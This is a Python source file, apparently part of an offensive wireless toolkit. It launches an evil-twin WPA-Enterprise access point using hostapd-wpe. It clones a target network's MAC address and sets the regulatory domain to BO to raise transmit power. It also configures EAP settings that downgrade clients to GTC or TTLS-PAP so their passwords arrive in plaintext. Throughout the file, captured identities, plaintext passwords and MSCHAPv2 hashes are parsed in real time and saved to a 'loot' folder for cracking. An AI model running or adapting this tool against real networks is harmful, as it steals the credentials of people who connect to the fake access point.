"""
rogue_ap.py — Evil twin AP via hostapd/hostapd-wpe with real-time
credential parsing, optimized EAP config, and DH parameter support.
"""

import subprocess
import os
import re
import shutil
import threading

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOOT_DIR = os.path.join(BASE_DIR, "loot")

# ── Auto-detect hostapd-wpe ──
WPE_AVAILABLE = shutil.which("hostapd-wpe") is not None
HOSTAPD_BIN = "hostapd-wpe" if WPE_AVAILABLE else "hostapd"
WPE_LOG = "/var/log/hostapd-wpe.log"


def set_tx_power(iface, power=30):
    subprocess.run(["iw", "reg", "set", "BO"],
                   stderr=subprocess.DEVNULL)
    subprocess.run(["iwconfig", iface, "txpower", str(power)],
                   stderr=subprocess.DEVNULL)
    print(f"[+] TX power set to {power}dBm")


def clone_mac(iface, bssid):
    subprocess.run(["ip", "link", "set", iface, "down"],
                   stderr=subprocess.DEVNULL)
    subprocess.run(["macchanger", "-m", bssid, iface],
                   stderr=subprocess.DEVNULL)
    subprocess.run(["ip", "link", "set", iface, "up"],
                   stderr=subprocess.DEVNULL)
    print(f"[+] MAC cloned → {bssid}")


def _parse_hostapd_line(line):
    """Parse hostapd/hostapd-wpe stdout for credential leaks in real-time."""
    os.makedirs(LOOT_DIR, exist_ok=True)

    # EAP Identity (username)
    id_match = re.search(
        r'STA\s+([\da-fA-F:]+).*EAP\s+Response[/-]Identity.*?:\s*(.+)',
        line, re.IGNORECASE
    )
    if id_match:
        mac, identity = id_match.group(1), id_match.group(2).strip()
        print(f"\n[IDENTITY] {identity} | MAC: {mac}")
        with open(os.path.join(LOOT_DIR, "identities.txt"), "a") as f:
            f.write(f"{identity} | {mac}\n")

    # GTC Plaintext password (gtc-downgrade mode — the gold standard)
    gtc_match = re.search(r'GTC.*password[:\s]+(.+)', line, re.IGNORECASE)
    if gtc_match:
        password = gtc_match.group(1).strip()
        print(f"\n[!!!] GTC PLAINTEXT → {password}")
        with open(os.path.join(LOOT_DIR, "cracked_passwords.txt"), "a") as f:
            f.write(f"GTC:{password}\n")

    # MSCHAPv2 hash (hashcat 5500 format)
    # hostapd-wpe format: username:::challenge:response:
    mschap_match = re.search(
        r'username[:\s]+(\S+).*?challenge[:\s]+([\da-fA-F]+).*?response[:\s]+([\da-fA-F]+)',
        line, re.IGNORECASE
    )
    if mschap_match:
        user, challenge, response = mschap_match.groups()
        hash_line = f"{user}::::{challenge}:{response}:"
        print(f"\n[HASH] MSCHAPv2 captured → {hash_line[:60]}...")
        with open(os.path.join(LOOT_DIR, "hashes.txt"), "a") as f:
            f.write(hash_line + "\n")

    # TTLS-PAP plaintext password
    pap_match = re.search(
        r'TTLS[- ]PAP.*?password[:\s]+(.+)', line, re.IGNORECASE
    )
    if pap_match:
        password = pap_match.group(1).strip()
        print(f"\n[!!!] TTLS-PAP PLAINTEXT → {password}")
        with open(os.path.join(LOOT_DIR, "cracked_passwords.txt"), "a") as f:
            f.write(f"PAP:{password}\n")


def _watch_wpe_log():
    """Watch hostapd-wpe log file for credentials (fallback/supplement)."""
    if not os.path.exists(WPE_LOG):
        return
    try:
        with open(WPE_LOG, "r") as f:
            # Seek to end so we only read new entries
            f.seek(0, 2)
            while True:
                line = f.readline()
                if not line:
                    import time
                    time.sleep(0.5)
                    continue
                _parse_hostapd_line(line)
    except Exception:
        pass


def generate_hostapd_conf(iface, ssid, channel=6,
                           negotiate="balanced", bssid=None):
    # ── Fixed eap_user format (Bug #4) ──
    # Phase 1: outer methods | Phase 2 ("t"): inner methods
    if negotiate == "gtc-downgrade":
        eap_user = '*       PEAP,TTLS,TLS,FAST\n"t"     GTC    [2]\n'
    elif negotiate == "balanced":
        eap_user = '*       PEAP,TTLS,TLS,FAST\n"t"     MSCHAPV2,GTC,MD5,TTLS-PAP    [2]\n'
    else:
        eap_user = '*       PEAP,TTLS,TLS,FAST\n"t"     MSCHAPV2,MD5    [2]\n'

    with open("/tmp/eapx.eap_user", "w") as f:
        f.write(eap_user)

    cert_dir = os.path.join(BASE_DIR, "certs")

    # ── Build hostapd config with DH params (Bug #5) ──
    dh_line = ""
    dh_path = os.path.join(cert_dir, "dh.pem")
    if os.path.exists(dh_path):
        dh_line = f"dh_file={dh_path}"

    conf = f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/tmp/eapx.eap_user
ca_cert={cert_dir}/ca.pem
server_cert={cert_dir}/server.pem
private_key={cert_dir}/server.key
{dh_line}

# ── EAP tuning (prevent retransmit storms) ──
eap_reauth_period=0
fragment_size=1400

# ── Logging ──
logger_stdout=-1
logger_stdout_level=0
"""
    if bssid:
        conf = f"bssid={bssid}\n" + conf
    with open("/tmp/eapx_hostapd.conf", "w") as f:
        f.write(conf)

    print(f"[+] Config → SSID: {ssid} | ch{channel} | Mode: {negotiate}")
    print(f"[+] Using: {HOSTAPD_BIN}" + (" (credential hooks active)" if WPE_AVAILABLE else " (limited credential capture)"))


def launch_ap(iface, ssid, channel=6, negotiate="balanced",
              bssid=None, boost_tx=True):

    if boost_tx:
        set_tx_power(iface)

    if bssid:
        clone_mac(iface, bssid)

    generate_hostapd_conf(iface, ssid, channel, negotiate, bssid)
    print("[*] Launching rogue AP... Press Ctrl+C to stop\n")

    # Start hostapd-wpe log watcher as supplement (if using wpe)
    if WPE_AVAILABLE:
        wpe_thread = threading.Thread(target=_watch_wpe_log, daemon=True)
        wpe_thread.start()

    try:
        proc = subprocess.Popen(
            [HOSTAPD_BIN, "/tmp/eapx_hostapd.conf"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        for line in proc.stdout:
            print(line, end="")
            _parse_hostapd_line(line)
    except KeyboardInterrupt:
        proc.terminate()
        proc.wait()
    print("\n[*] Rogue AP stopped")
